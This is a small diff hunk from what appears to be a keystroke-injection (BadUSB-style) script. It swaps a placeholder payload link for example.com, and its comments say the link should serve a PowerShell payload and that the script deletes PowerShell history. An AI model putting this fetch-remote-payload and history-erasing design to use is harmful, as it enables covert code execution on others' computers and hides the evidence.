@@ -19,7 +19,7 @@ REM 5. Delete powershell history
 REM
 
 REM Reply with YOUR LINK. The Payload should be close_all_app.ps1
-DEFINE POWERSHEL_CODE YOUR_END_USER_LINK_WITH_PAYLOAD
+DEFINE POWERSHEL_CODE example.com
 
 DELAY 2000
 GUI x
